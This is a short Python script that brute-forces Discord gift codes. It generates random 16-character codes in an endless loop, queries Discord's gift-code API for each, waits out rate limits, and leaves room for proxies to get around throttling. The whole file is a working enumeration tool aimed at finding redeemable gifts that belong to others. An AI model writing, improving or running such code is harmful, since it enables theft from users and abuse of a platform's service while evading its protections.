import requests, string, json, time, random

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

proxies = {

}

def check_code(code, proxies):
	while True:
		r = requests.get('https://discord.com/api/v6/entitlements/gift-codes/' + code, proxies=proxies)
		#print(r.text)
		result = json.loads(r.text)
		if "message" in result:
			if result["message"] == "You are being rate limited.":
				print(bcolors.WARNING + "======> [WARN] You are being rate limited for: " + str(result["retry_after"]) + " ms" + bcolors.ENDC)
				time.sleep(result["retry_after"] / 1000)
			elif result["message"] == "Unknown Gift Code":
				print(bcolors.FAIL + "======> [INFO] Unknown gift code: " + str(code) + bcolors.ENDC)
				return
			else:
				print(bcolors.OKGREEN + "======> [INFO] Found gift: " + str(code) + bcolors.ENDC)
				return
		else:
			print(bcolors.FAIL + "======> [ERR] Failed to find 'message' for code: " + str(code) + bcolors.ENDC)
			return


while True:
	code = ("".join(random.choice(string.ascii_letters + string.digits) for _ in range(16)))
	check_code(code, proxies)
	time.sleep(10)
